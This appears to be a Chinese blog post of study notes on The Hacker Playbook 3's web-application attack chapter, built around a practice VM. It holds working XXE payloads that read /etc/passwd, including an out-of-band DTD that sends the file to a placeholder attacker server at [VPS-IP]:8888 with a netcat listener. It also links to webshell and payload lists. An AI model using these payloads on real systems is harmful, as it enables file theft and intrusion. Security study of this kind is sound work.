+<p>我喜欢使用涉及利用 JavaScript 功能的自定义红队攻击。我们知道 JavaScript 非常强大，我们在 BeEF（浏览器开发框架）中看到过这样的功能。因此，我们可以利用所有这些功能来执行受害者不知情的攻击。这个 payload 会做些什么？攻击的一个示例是让受害者计算机上运行的 JavaScript XSS payload 获取受害者的内部（自然）IP 地址。然后，我们可以获取其 IP 地址并开始使用我们的 payload 扫描其内部网络。如果我们发现一个允许在没有身份验证的情况下就可以登入的 Web 应用程序，我们就可以向该服务器发送 payload。</p>
+<h2 id="反序列化攻击"><a href="#反序列化攻击" class="headerlink" title="反序列化攻击"></a>反序列化攻击</h2><p>序列化数据有很多原因，但最常用于生成值/数据的可存储表示而不会丢失其类型或结构。序列化将对象转换为字节流，以通过网络传输或存储。通常，转换方法涉及 XML，JSON 或特定于该语言的序列化方法。</p>
+<p><strong>书中的举例是Nodejs语言的反序列化漏洞，不想深入了解，后续补充其他语言的反序列化漏洞实例。</strong></p>
+<h2 id="模板引擎攻击–模板注入"><a href="#模板引擎攻击–模板注入" class="headerlink" title="模板引擎攻击–模板注入"></a>模板引擎攻击–模板注入</h2><p><strong>这个又是Nodejs，不写了。</strong></p>
+<h2 id="JavaScript-和远程代码执行"><a href="#JavaScript-和远程代码执行" class="headerlink" title="JavaScript 和远程代码执行"></a>JavaScript 和远程代码执行</h2><p>远程代码执行是我们在每次入侵和 Web 应用程序渗透测试中必须寻找的。虽然 RCE 几乎可能在任何地方找到，但它们最常见于允许上传的地方，例如：上传 web shell，一个像 Imagetragick 这样的漏洞利用，使用 Office 文件进行XXE 攻击，基于遍历的目录上传以替换关键文件等。</p>
+<p>传统来说，我们可能会尝试找到我们可以使用的上传区域和 shell。可以在此处找到不同类型的 webshell payload 的绝佳列表：<a href="https://github.com/tennc/webshell" target="_blank" rel="noopener">https://github.com/tennc/webshell</a> 。请注意，我绝不会审查任何这些 shell 是否存在后门，所以使用它们需要你自担风险。我遇到过很多有后门的 shell。</p>
+<h2 id="服务器端请求伪造（SSRF）"><a href="#服务器端请求伪造（SSRF）" class="headerlink" title="服务器端请求伪造（SSRF）"></a>服务器端请求伪造（SSRF）</h2><p>其他资源：</p>
+<ul>
+<li><p>本地的很多编码：</p>
+<ul>
+<li><a href="http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf" target="_blank" rel="noopener">http://www.agarri.fr/docs/AppSecEU15-Server_side_browsing_considered_harmful.pdf</a></li>
+</ul>
+</li>
+<li><p>Bug Bounty - AirBNB</p>
+<ul>
+<li><a href="https://buer.haus/2017/03/09/airbnb-chaining-third-party-open-redirect-into-server-side-request-forgery-ssrf-via-liveperson-chat/" target="_blank" rel="noopener">示例</a></li>
+</ul>
+</li>
+</ul>
+<h2 id="XML-外部实体攻击（XXE）"><a href="#XML-外部实体攻击（XXE）" class="headerlink" title="XML 外部实体攻击（XXE）"></a>XML 外部实体攻击（XXE）</h2><p>XML 代表可扩展标记语言，旨在发送/存储易于阅读的数据。 XML eXternal Entities（XXE）是对应用程序中 XML 解析器的攻击。XML 解析常见于允许文件上传，解析 Office 文档，JSON 数据甚至 Flash 类型游戏的应用程序中。当允许 XML 解析时，不正确的验证可以授予攻击者读取文件的权限、导致拒绝服务攻击，甚至远程代码执行。从一个比较高的维度来看，应用程序具有以下需求：</p>
+<ul>
+<li>1) 解析用户提供的 XML 数据，</li>
+<li>2) 实体的系统标识符部分必须在文档类型声明(DTD)内，</li>
+<li>3) XML处理器必须验证/处理 DTD 并解析外部实体。</li>
+</ul>
+<p>XXE实验：</p>
+<p>一个 VMWare虚拟机用于 XXE 攻击</p>
+<ul>
+<li><a href="http://dl1.thehackerplaybook.com/THP-xxe-vm.zip" target="_blank" rel="noopener">http://dl1.thehackerplaybook.com/THP-xxe-vm.zip</a></li>
+</ul>
+<p>下载后，在 VMWare 中打开虚拟机并启动它。在登录屏幕上，你无需登录，但你应该看到系统的 IP 地址。<br>转到浏览器：</p>
+<ul>
+<li>通过 Burp Suite 代理所有流量</li>
+<li>转到 URL：http://[IP of your Virtual Machine]</li>
+<li>拦截流量并点击 Hack the XML</li>
+</ul>
+<p>如果在加载页面后查看页面的 HTML 源代码，你可以看到有一个通过 POST 请求提交的隐藏字段。XML 内容如下所示：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version =<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE thp [</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT thp ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY book "Universe"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thp</span>&gt;</span> Hack The &amp;book;<span class="tag">&lt;/<span class="name">thp</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>在这个例子中，我们指定它是 XML 1.0版本，DOCTYPE，指定根元素是 thp， !ELEMENT 指定任何类型，并且!ENTITY 将 book变量设置为“Universe”字符串。最后，在我们的 XML 输出中，我们希望从解析 XML 文件中打印出我们的实体。这通常是你在发送 XML 数据的应用程序中看到的内容。由于我们控制具有 XML 请求的 POST 数据，因此我们可以尝试注入我们自己的恶意实体。默认情况下，大多数 XML 解析库都支持 SYSTEM 关键字，该关键字允许从 URI 读取数据(包括使用 file:// 协议 )。因此，我们可以创建自己的实体来制作在 /etc/passwd 上读取的文件。<br>恶意payload：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE thp[</span></span><br><span class="line"><span class="meta">&lt;!ELEMENT thp ANY&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY book SYSTEM "file:///etc/passwd"&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">thp</span>&gt;</span>Hack The &amp;book;<span class="tag">&lt;/<span class="name">thp</span>&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png" alt="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png"></p>
+<h2 id="高级-XXE-–-XXE-OOB"><a href="#高级-XXE-–-XXE-OOB" class="headerlink" title="高级 XXE – XXE-OOB"></a>高级 XXE – XXE-OOB</h2><p>在之前的攻击中，我们能够在 <thp> 标签中获得返回的响应。那么如果我们看不到响应或遇到字符或文件限制怎么办？我们怎样使用带外数据协议（OOB）来发送我们的数据？我们可以提供远程文档类型定义（DTD）文件来执行OOB-XXE，而不是在请求 payload 中定义我们的攻击。DTD 是结构良好的 XML 文件，用于定义 XML 文档的结构和法律元素及属性。为了简单起见，我们的 DTD 将包含我们所有的攻击或 exfil payload，这将帮助我们解决许多字符的限制。</thp></p>
+<p>新的 XXE 攻击将分四个阶段进行：</p>
+<ol>
+<li>使用篡改后的 XXE XML 攻击</li>
+<li>对于存在漏洞的 XML 解析器，它会从攻击者服务器抓取一个 DTD 文件</li>
+<li>该 DTD 文件包含读取 /etc/passwd 文件的代码</li>
+<li>该 DTD文件也包含用于隐秘传输 /etc/passwd 内容的代码（可能是经过编码的）</li>
+</ol>
+<ul>
+<li><p>我们需要通过创建名为 payload.dtd 的文件在攻击者服务器上托管此payload</p>
+<ul>
+<li>vim /var/www/html/payload.dtd<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">file:</span>///<span class="attr">etc</span>/<span class="attr">passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://[VPS-IP]:8888/collect=%file;'&gt;"&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>在进行 XXE 攻击时，通常会遇到解析器错误。很多时候，XXE解析器仅仅允许某些字符，因此读取带有特殊字符的文件会报错。我们可以做些什么来解决这个问题？在使用PHP 的情况下，我们可以使用 PHP 输入和输出流（ 参考：<a href="http://php.net/manual/en/wrappers.php.php" target="_blank" rel="noopener">http://php.net/manual/en/wrappers.php.php</a> ）来读取本地文件，并使用 php://filter/read=convert.base64-encode 对它们进行 base64 编码。更改paylaod.dtd文件使用此功能：</p>
+<ul>
+<li>vim /var/www/html/payload.dtd<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!ENTITY</span> % <span class="attr">file</span> <span class="attr">SYSTEM</span> "<span class="attr">php:</span>//<span class="attr">filter</span>/<span class="attr">read</span>=<span class="string">convert.base64-encode/resouce</span>=<span class="string">file:///etc/passwd</span>"&gt;</span></span><br><span class="line">&lt;!ENTITY % all "&lt;!ENTITY send SYSTEM 'http://[Your_IP]:8888/collect=%file;'&gt;"&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+</li>
+<li><p>用NetCat监听8888端口</p>
+<ul>
+<li>nc -l -p 8888</li>
+</ul>
+</li>
+</ul>
+<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png" alt="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/黑客秘籍3/xxe_passwd.png"></p>
+<p>更多 XXE payload：</p>
+<ul>
+<li><a href="https://gist.github.com/staaldraad/01415b990939494879b4" target="_blank" rel="noopener">https://gist.github.com/staaldraad/01415b990939494879b4</a></li>
+<li><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt" target="_blank" rel="noopener">https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/XXE-Fuzzing.txt</a>    </li>
+</ul>
+<h1 id="本章总结"><a href="#本章总结" class="headerlink" title="本章总结"></a>本章总结</h1><p>虽然这只是你可能遇到的所有不同网络攻击的一小部分，但我希望这些案例能打开你的视野，关于更现代的框架（Node.js）是如何引入旧的和新的攻击。许多常见的应用程序漏洞扫描器往往会错过很多这些更复杂的漏洞，因为它们是基于特定的语言或框架的。我想提出的要点是，为了进行充分的攻击活动，你需要真正理解语言和框架。</p>
+
+        </section>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+
+        <!--
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/THE-HACKER-PLAYBOOK-3/"># THE-HACKER-PLAYBOOK-3</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        -->
+        <!--
+        <section class="post-nav">
+            
+                <a class="prev" rel="prev" href="/2019/04/18/THE-HACKER-PLAYBOOK-3-笔记-开始攻击网络/">THE-HACKER-PLAYBOOK-3-笔记-开始攻击网络</a>
+            
+            
+            <a class="next" rel="next" href="/2019/04/01/THE-HACKER-PLAYBOOK-3-笔记-红队侦察/">THE-HACKER-PLAYBOOK-3-笔记-红队侦查</a>
+            
+        </section>
+        -->
+
+    </article>
+</div>
+
+        </div>
+        <!--
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© langke | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    	-->
+
+    	<br>
+    	<br>
+    	<br>
+
+
+
+    </div>
+</body>
+</html>
